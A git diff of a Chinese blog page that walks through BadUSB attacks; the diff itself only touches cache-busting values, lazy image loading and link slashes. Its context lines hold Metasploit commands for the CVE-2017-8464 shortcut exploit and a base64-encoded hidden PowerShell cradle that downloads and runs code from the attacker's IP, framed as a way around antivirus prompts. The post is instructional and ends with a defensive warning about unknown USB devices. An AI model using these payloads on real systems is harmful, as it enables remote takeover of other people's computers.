@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1569308794284">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1586240241517">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -36,7 +36,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1569308794284" class="site-logo">
+        <img src="https://mari0er.github.io/images/avatar.png?v=1586240241517" class="site-logo">
         <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -116,7 +116,7 @@ msf exploit(cve_2017_8464_lnk_rce) &gt; set lhost 192.168.10.18
 msf exploit(cve_2017_8464_lnk_rce) &gt; set lport 4444
 msf exploit(cve_2017_8464_lnk_rce) &gt; exploit
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0601.png" alt=""></figure>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0601.png" alt="" loading="lazy"></figure>
 <h2 id="0x02">0x02</h2>
 <p>  生成完文件之后，利用handler模块监听回连的meterpreter。接下来，如果你的U盘插入电脑显示是<strong>F盘</strong>就将带F盘符的快捷方式文件和cpl文件一起放入U盘的根目录(建议多放几个快捷方式文件，说不定有的人电脑都到J盘了)，然后插入电脑就可以触发漏洞并回弹shell。这种方法严格上不能叫做BadUSB,因为这只是简单的利用了Windows的漏洞，生成的文件容易被杀软查杀。<br>
 <strong>注意：</strong> 1.Kali地址--192.168.10.18<br>
@@ -131,7 +131,7 @@ msf exploit(handler) &gt; run
 </code></pre>
 <h2 id="0x03">0x03</h2>
 <p>  那什么才是真正的BadUSB呢？我的理解是：利用一个类似U盘的东西插入电脑，U盘将自动模拟成键盘并输入定义好的代码以完成攻击，能完美绕过所有的杀软，因为这属于硬件的入侵，具体的分析和原理请点击<a href="http://www.freebuf.com/articles/terminal/131193.html">这里</a>查看详细说明文章。文章里详细记录了利用Arduino开发板模仿TEENSY的过程，这里我就不重复说明制作过程了，主要来说说如何解决黑框和弹窗的问题。<br>
-<img src="https://raw.githubusercontent.com/mari0er/picture/master/0505/0602.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0505/0602.png" alt="" loading="lazy"><br>
 上图是我直接在某电商平台买的Arduino开发板成品，基本上可以完美伪装成U盘。下面利用BadUSB获得shell为例子，来实战一番。</p>
 <h2 id="0x04">0x04</h2>
 <p>  首先，利用msf生成基于psh的payload。直接将生成的代码输入目标电脑的cmd终端会获得shell，但是在有360存在的情况下，会弹窗提示用户是否运行powershell，阻断代码的执行。此时心想如果目标用户自愿手动打开一个powershell终端，然后输入命令应该不会弹窗了吧？</p>
@@ -163,7 +163,7 @@ msf exploit(multi/script/web_delivery) &gt;
 <p>  手工实验，直接打开powershell可以绕过弹窗获得shell，但是需要修改命令为base64的格式。修改后的payload代码如下</p>
 <pre><code>powershell -w hidden -ep bypass -enc JABxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAcQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHEALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAPQBbAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBJAEUAWAAgACQAcQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQA4AC8AJwApADsACgA=
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0603.png" alt=""></figure>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0603.png" alt="" loading="lazy"></figure>
 <h2 id="0x05">0x05</h2>
 <p>  接下来就是最重要的一步了，如何让USB模拟键盘输入上述指定的payload？利用Arduino开发板编译指定的代码即可实现，代码编写很简单，基本上只需要如下几行命令。相信大家也都看得懂了，只要在括号里填入想要输入的代码即可。</p>
 <blockquote>
@@ -208,9 +208,9 @@ void loop() {
   // put your main code here, to run repeatedly:
 }
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0604.png" alt=""></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/0604.png" alt="" loading="lazy"></figure>
 <p>编译，上传时记得选择开发板类型和端口,上传完成后开发板会自动断开Arduino并连接电脑，记得及时拔掉开发板，不然会在主机上输入上述payload。此时打开隐藏终端时还是会有蓝框闪过，但是时间很短，从插上开发板到完成攻击大概只需要2秒钟。完整效果演示如下<br>
-<img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/BadUSB.gif" alt=""></p>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0606/BadUSB.gif" alt="" loading="lazy"></p>
 <h2 id="0x06">0x06</h2>
 <p>  上述代码只是简单的利用msf获得shell，还有很多其他的玩法，比如<a href="http://www.freebuf.com/articles/100026.html">这篇文章</a>利用BadUSB窃取指定文件,还有<a href="http://www.freebuf.com/articles/terminal/6182.html">这篇文章</a>利用set工具集进行渗透。总之，通过自定义的payload还可以完成更多自己想要的操作。所以，对于来历不明的USB千万不要轻易插到自己的电脑上，如果必要可以插到自己的虚拟机进行读取操作。</p>
 <blockquote>
@@ -223,15 +223,15 @@ void loop() {
             
               <div class="tag-container">
                 
-                  <a href="https://mari0er.github.io/tag/badbsb" class="tag">
+                  <a href="https://mari0er.github.io/tag/badbsb/" class="tag">
                     badbsb
                   </a>
                 
-                  <a href="https://mari0er.github.io/tag/tennsy" class="tag">
+                  <a href="https://mari0er.github.io/tag/tennsy/" class="tag">
                     Tennsy
                   </a>
                 
-                  <a href="https://mari0er.github.io/tag/arduino" class="tag">
+                  <a href="https://mari0er.github.io/tag/arduino/" class="tag">
                     Arduino
                   </a>
                 
@@ -240,7 +240,7 @@ void loop() {
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://mari0er.github.io/post/usb.html">
+                <a href="https://mari0er.github.io/post/usb.html/">
                   <h3 class="post-title">
                     利用U盘绕过电脑开机密码
                   </h3>
